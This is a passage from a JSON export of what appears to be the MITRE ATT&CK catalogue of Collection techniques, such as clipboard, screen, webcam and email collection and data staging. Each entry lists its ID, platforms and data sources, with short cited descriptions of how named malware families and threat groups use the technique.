                    "Description": "A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image.[6]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can retrieve the current content of the user clipboard.[7]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy can steal clipboard contents.[8]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM collects data from the clipboard.[9]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT contains code to open and copy data from the clipboard.[10]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot contains functionality to collect information from the clipboard.[11]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN collects data stored in the clipboard.[12]"
                }
            ]
        },
        "Data from Information Repositories": {
            "Name": "Data from Information Repositories",
            "Description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentialsWork / project schedulesSource code snippetsLinks to network shares and other internal resourcesSpecific common information repositories include:Microsoft SharePointFound in many enterprise networks and often used to store and share significant amounts of documentation.Atlassian ConfluenceOften found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.\n",
            "ID": "T1213",
            "Tactic": "Collection",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Application logs, Authentication logs, Data loss prevention, Third-party application logs",
            "Contributors: ": "Milos Stojadinovic",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has collected information from Microsoft SharePoint services within target networks.[1]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember.[2]"
                },
                {
                    "Name": "spwebmember",
                    "Description": "spwebmember is used to enumerate and dump information from Microsoft SharePoint.[2]"
                }
            ]
        },
        "Data from Local System": {
            "Name": "Data from Local System",
            "Description": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a Command-Line Interface, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.\n",
            "ID": "T1005",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 has collected files from a local victim.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before.[2][3]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 will identify Microsoft Office documents on the victim's computer.[4]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has collected data from victims' local systems.[5]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[6][7]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot collects files from the local system.[8]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has exfiltrated files stolen from local systems.[9]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto can collect data from user directories.[10]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can collect data from a local system.[11]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.[12]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.[13]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 collected data from local victim systems.[14]"
                },
                {
                    "Name": "Dust Storm",
                    "Description": "Dust Storm has used Android backdoors capable of exfiltrating specific files directly from the infected devices.[15]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.[16]"
                },
                {
                    "Name": "Forfiles",
                    "Description": "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).[2]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[17]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee collects data from the local victim system.[18]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can read data from files.[19][20]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar uploads files from a specified directory to the C2 server.[21]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang gathered information and files from local directories for exfiltration.[22]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can download files off the target system to send back to the server.[23]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Lazarus Group malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.[24][25][26]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can obtain data from local systems.[27]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder exfiltrates data collected from the victim mobile device.[28]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can retrieve files.[29]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork collected and exfiltrated files from the infected system.[30]"
                },
                {
                    "Name": "PinchDuke",
                    "Description": "PinchDuke collects user files from the compromised host based on predefined file extensions.[31]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a backdoor through which remote attackers can steal system information.[32]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.[33][34]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can upload files from compromised hosts.[35]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc searches the local system and gathers data.[36]"
                },
                {
                    "Name": "PUNCHTRACK",
                    "Description": "PUNCHTRACK scrapes memory for properly formatted payment card data.[37][38]"
                },
                {
                    "Name": "RawPOS",
                    "Description": "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.[39][40][41]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover searches for files on local drives based on a predefined list of file extensions.[42]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers data from the local victim system.[43]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[44]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot collects local files and information from the victim’s local machine.[45]"
                },
                {
                    "Name": "yty",
                    "Description": "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.[46]"
                }
            ]
        },
        "Data from Network Shared Drive": {
            "Name": "Data from Network Shared Drive",
            "Description": "Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.Adversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.\n",
            "ID": "T1039",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BADNEWS",
                    "Description": "When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[1]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has exfiltrated files stolen from file shares.[2]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list.[3]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.[4]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug extracted Word documents from a file server on a victim network.[5]"
                }
            ]
        },
        "Data from Removable Media": {
            "Name": "Data from Removable Media",
            "Description": "Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.Adversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.\n",
            "ID": "T1025",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "An APT28 backdoor may collect the entire contents of an inserted USB device.[1]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS copies files with certain extensions from USB devices toa predefined directory.[2]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list.[3]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a module to collect data from removable drives.[4]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.[5]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[6]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT steals files based on an extension list if a USB drive is connected to the system.[7]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.[8]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec has a package that collects documents from any inserted USB sticks.[9]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds.[10]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim.[11][12]"
                }
            ]
        },
        "Data Staged": {
            "Name": "Data Staged",
            "Description": "Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Data Compressed or Data Encrypted.Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n",
            "ID": "T1074",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL stores output from command execution in a .dat file in the %TEMP% directory.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has stored captured credential information in a file named pi.log.[2]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to stage files for exfiltration in a single location.[3]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.[4][5]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.[6][7]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations.[8]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 created a directory named \"out\" in the user's %AppData% folder and copied files to it.[9]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.[10]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment.[11]"
                },
                {
                    "Name": "FIN6",
                    "Description": "TRINITY malware used by FIN6 identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\\Windows\\. Once the malware collects the data, FIN6 actors compressed data and moved it to another staging system before exfiltration.[12]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 aggregates staged data from a network into a single location.[13]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.[14]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon stores information gathered from the endpoint in a file named 1.hwp.[15]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth creates folders to store output from batch scripts prior to sending the information to its C2 server.[16]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.[17]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole determines a working directory where it stores all the gathered data about the compromised machine.[18]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar stages command output and collected data in files before exfiltration.[19]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.[20][21]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.[22]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[23]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind saves information from its keylogging routine as a .zip file in the present working directory.[24]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT writes multiple outputs to a TMP file using the >> method.[25]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE stages the output from command execution and collected files in specific folders before exfiltration.[26]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server.[5]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy stages collected data in a text file.[27]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka creates a directory, %USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files.[28]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files.[29]"
                },
                {
                    "Name": "PUNCHTRACK",
                    "Description": "PUNCHTRACK aggregates collected data in a tmp file.[13]"
                },
                {
                    "Name": "RawPOS",
                    "Description": "Data captured by RawPOS is placed in a temporary file under a directory named \"memdump\".[30]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover copies files from removable drives to C:\\system.[31]"
                },
                {
                    "Name": "SPACESHIP",
                    "Description": "SPACESHIP identifies files with certain extensions and copies them to a directory in the user's profile.[14]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has staged encrypted archives for exfiltration on Internet-facing servers that had previously been compromised with China Chopper.[32]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can create a directory (C:\\ProgramData\\Mail\\MailAg\\gl) to use as a temporary directory for uploading files.[33]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.[34][35]"
                }
            ]
        },
        "Email Collection": {
            "Name": "Email Collection",
            "Description": "Adversaries may target user email to collect sensitive information from a target.Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.\n",
            "ID": "T1114",
            "Tactic": "Collection",
            "Platform: ": "Windows",
            "Data Sources: ": "Authentication logs, File monitoring, Process monitoring, Process use of network",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has collected emails from victim Microsoft Exchange servers.[2]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects address book information from Outlook.[3]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.[4]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.[5]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to collect and exfiltrate emails from Outlook.[6]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 accessed email accounts using Outlook Web Access.[7]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang used a .NET tool to dump data from Microsoft Exchange mailboxes.[8]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords.[9]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has collected .PST archives.[10]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can interact with a victim’s Outlook session and look through folders and emails.[11]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[12]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).[13]"
                }
            ]
        },
        "Man in the Browser": {
            "Name": "Man in the Browser",
            "Description": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. [1]A specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. [2] [3]Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. [4]\n",
            "ID": "T1185",
            "Tactic": "Collection",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Authentication logs, Packet capture, Process monitoring, API monitoring",
            "Contributors: ": "Justin Warner, ICEBRG",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.[4]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.[5][6][7]"
                }
            ]
        },
        "Screen Capture": {
            "Name": "Screen Capture",
            "Description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.MacOn OSX, the native command screencapture is used to capture screenshots.LinuxOn Linux, there is the native command xwd. [1]\n",
            "ID": "T1113",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "API monitoring, Process monitoring, File monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has used tools to take screenshots from victims.[2][3][4]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS has a command to take a screenshot and send it to the C2 server.[5][6]"
                },
                {
                    "Name": "Bandook",
                    "Description": "Bandook is capable of taking an image of and uploading the current desktop.[7]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy is capable of taking screenshots.[8]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used a tool to capture screenshots.[9]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.[10]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas captures screenshots based on specific keywords in the window’s title.[11]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK has the capability to capture screenshots.[4]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike's \"beacon\" payload is capable of capturing screen shots.[12]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke takes periodic screenshots and exfiltrates them.[13]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to perform screen captures.[14]"
                },
                {
                    "Name": "CrossRAT",
                    "Description": "CrossRAT is capable of taking screen captures.[7]"
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal took screen shots using their Windows malware.[7]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf can take screenshots.[15][9]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of performing screen captures.[16]"
                },
                {
                    "Name": "DOGCALL",
                    "Description": "DOGCALL is capable of capturing screenshots.[17]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).[18][19]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab has the capability to capture screenshots.[20]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 captured screenshots and desktop video recordings.[21]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.[22][23]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame can take regular screenshots when certain applications are open that are sent to the command and control server.[24]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly takes screenshots of the user's desktop.[25]"
                },
                {
                    "Name": "Group5",
                    "Description": "Malware used by Group5 is capable of watching the victim's screen.[26]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can obtain screenshots from the victim.[27]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.[28]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.[29]"
                },
                {
                    "Name": "Janicab",
                    "Description": "Janicab captured screenshots and sent them out to a C2 server.[30][31]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "A JHUHUGIT variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.[32]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT has the capability to take screenshots of the victim’s machine.[33]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to initiate keylogging and screen captures.[34]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar captures screenshots of the victim’s screen.[35]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE can capture screenshots of the victim’s machine.[36]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy can capture screenshots of the desktop over multiple monitors.[25]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware can take a screenshot and upload the file to its C2 server.[37]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka is capable of performing screen captures.[38][39]"
                },
                {
                    "Name": "NETWIRE",
                    "Description": "NETWIRE can capture the victim's screen.[40]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has a tool called CANDYKING to capture a screenshot of user's desktop.[41]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM can perform screen capturing.[17]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.[42][43]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can retrieve screenshots from compromised hosts.[44]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER can capture a screenshot from a victim.[45]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka contains a module that captures screenshots of the victim's desktop.[46]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton captures the content of the desktop with the screencapture binary.[25]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon can capture screenshots at a configurable interval.[47]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.[48]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can capture screenshots.[49][50]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin has a command named $screenshot that may be responsible for taking screenshots of the victim machine.[51]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT captures screenshots of the infected system.[52][53]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes.[54]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can capture screenshots.[55]"
                },
                {
                    "Name": "SHUTTERSPEED",
                    "Description": "SHUTTERSPEED can capture screenshots.[17]"
                },
                {
                    "Name": "Socksbot",
                    "Description": "Socksbot can take screenshots.[56]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.[57]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot contains screen capture functionality.[58]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png.[59]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of taking screenshots.[60]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT can capture desktop screenshots in the PNG format and send them to the C2 server.[61]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN can perform screen captures of the victim’s machine.[62]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.[3]"
                },
                {
                    "Name": "yty",
                    "Description": "yty collects screenshots of the victim machine.[63]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to obtain screenshots of the compromised system.[64]"
                }
            ]
        },
        "Video Capture": {
            "Name": "Video Capture",
            "Description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. [1]\n",
            "ID": "T1125",
            "Tactic": "Collection",
            "Platform: ": "Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, File monitoring, API monitoring",
            "Contributors: ": "Praetorian",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Bandook",
                    "Description": "Bandook has modules that are capable of capturing from a victim's webcam.[2]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of capturing video.[3]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab has the capability to capture video from a victim machine.[4]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.[5][6]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can remotely activate the victim’s webcam to capture content.[7]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT has the capability to access the webcam on the victim’s machine.[8]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar captures images from the webcam.[9]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can access a connected webcam and capture pictures.[10]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can perform webcam viewing.[11][12]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[13]"
                }
            ]
        },
        "Automated Exfiltration": {
            "Name": "Automated Exfiltration",
            "Description": "Data, such as sensitive documents, may be exfiltrated through the use of automated processing or Scripting after being gathered during Collection. When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.\n",
            "ID": "T1020",
            "Tactic": "Exfiltration",
